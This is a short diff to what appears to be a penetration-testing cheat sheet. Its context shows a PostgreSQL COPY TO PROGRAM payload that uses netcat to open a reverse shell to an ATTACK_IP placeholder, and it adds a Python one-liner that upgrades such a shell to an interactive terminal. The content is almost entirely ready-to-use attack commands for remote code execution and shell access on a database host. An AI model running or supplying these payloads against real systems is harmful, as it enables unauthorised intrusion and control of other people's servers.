@@ -29,3 +29,8 @@ open for via `pg_sleep`. Also be sure to set the ATTACK_IP.
 ```
 COPY (SELECT pg_sleep(120)) TO PROGRAM 'nc ATTACK_IP 4444 | /bin/bash -i 2>&1 | nc ATTACK_IP 4445;'
 ```
+
+## Python psuedo terminal upgrade
+```
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
